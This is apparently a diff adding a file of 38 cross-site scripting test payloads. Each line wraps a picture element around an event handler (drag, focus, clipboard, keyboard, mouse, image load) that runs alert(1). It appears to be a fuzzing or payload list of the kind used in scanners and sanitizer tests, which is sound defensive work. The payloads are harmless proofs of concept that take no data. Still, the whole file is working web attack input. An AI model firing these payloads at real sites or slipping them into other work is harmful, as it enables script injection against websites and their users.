@@ -1,0 +1,38 @@
+<picture draggable="true" ondrag="alert(1)">test</picture>
+<picture draggable="true" ondragend="alert(1)">test</picture>
+<picture draggable="true" ondragenter="alert(1)">test</picture>
+<picture draggable="true" ondragleave="alert(1)">test</picture>
+<picture draggable="true" ondragstart="alert(1)">test</picture>
+<picture id=x tabindex=1 onactivate=alert(1)></picture>
+<picture id=x tabindex=1 onbeforeactivate=alert(1)></picture>
+<picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>
+<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>
+<picture id=x tabindex=1 onfocus=alert(1)></picture>
+<picture id=x tabindex=1 onfocusin=alert(1)></picture>
+<picture onbeforecopy="alert(1)" contenteditable>test</picture>
+<picture onbeforecut="alert(1)" contenteditable>test</picture>
+<picture onbeforepaste="alert(1)" contenteditable>test</picture>
+<picture onblur=alert(1) tabindex=1 id=x></picture><input autofocus>
+<picture onclick="alert(1)">test</picture>
+<picture oncontextmenu="alert(1)">test</picture>
+<picture oncopy="alert(1)" contenteditable>test</picture>
+<picture oncut="alert(1)" contenteditable>test</picture>
+<picture ondblclick="alert(1)">test</picture>
+<picture onfocusout=alert(1) tabindex=1 id=x></picture><input autofocus>
+<picture onkeydown="alert(1)" contenteditable>test</picture>
+<picture onkeypress="alert(1)" contenteditable>test</picture>
+<picture onkeyup="alert(1)" contenteditable>test</picture>
+<picture onmousedown="alert(1)">test</picture>
+<picture onmouseenter="alert(1)">test</picture>
+<picture onmouseleave="alert(1)">test</picture>
+<picture onmousemove="alert(1)">test</picture>
+<picture onmouseout="alert(1)">test</picture>
+<picture onmouseover="alert(1)">test</picture>
+<picture onmouseup="alert(1)">test</picture>
+<picture onpaste="alert(1)" contenteditable>test</picture>
+<picture><source srcset="validimage.png"><image onload=alert(1)></picture>
+<picture><source srcset="validimage.png"><image onloadend=alert(1)></picture>
+<picture><source srcset="validimage.png"><image onloadstart=alert(1)></picture>
+<picture><source srcset="validimage.png"><img onload=alert(1)></picture>
+<picture><source srcset="validimage.png"><img onloadend=alert(1)></picture>
+<picture><source srcset="validimage.png"><img onloadstart=alert(1)></picture>
